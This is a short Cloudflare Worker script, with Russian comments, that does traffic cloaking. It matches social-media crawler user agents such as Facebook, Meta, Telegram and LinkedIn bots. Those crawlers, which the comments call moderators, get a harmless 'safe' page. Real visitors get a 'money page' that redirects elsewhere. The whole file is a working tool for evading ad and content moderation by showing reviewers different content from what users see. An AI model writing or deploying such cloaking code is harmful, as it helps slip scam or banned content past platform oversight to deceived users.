export default {
  async fetch(request, env) {
    const url = new URL(request.url);
    const userAgent = request.headers.get('User-Agent') || '';

    // Паттерны ботов ФБ, Инсты, ТГ и других краулеров
    const botPatterns = [
      "facebookexternalhit", "Facebot", "meta-externalagent",
      "LinkedInBot", "Twitterbot", "TelegramBot", "WhatsApp", 
      "Viber", "Discordbot"
    ];

    // Проверяем, есть ли совпадение по юзер-агенту
    const isBot = botPatterns.some(pattern =>
      new RegExp(pattern, 'i').test(userAgent)
    );

    // Перехватываем запрос только к главной странице
    if (url.pathname === '/' || url.pathname === '/index.html') {
        if (isBot) {
          // Если это бот (модератор/краулер ФБ) -> отдаем "белую" страницу
          return env.ASSETS.fetch(new Request(new URL('/safe_page.html', request.url)));
        } else {
          // Если это реальный юзер -> отдаем страницу с редиректом Auditzy
          return env.ASSETS.fetch(new Request(new URL('/money_page.html', request.url)));
        }
    }

    // Все остальные запросы (если будут картинки или другие пути) пропускаем как обычно
    return env.ASSETS.fetch(request);
  }
};
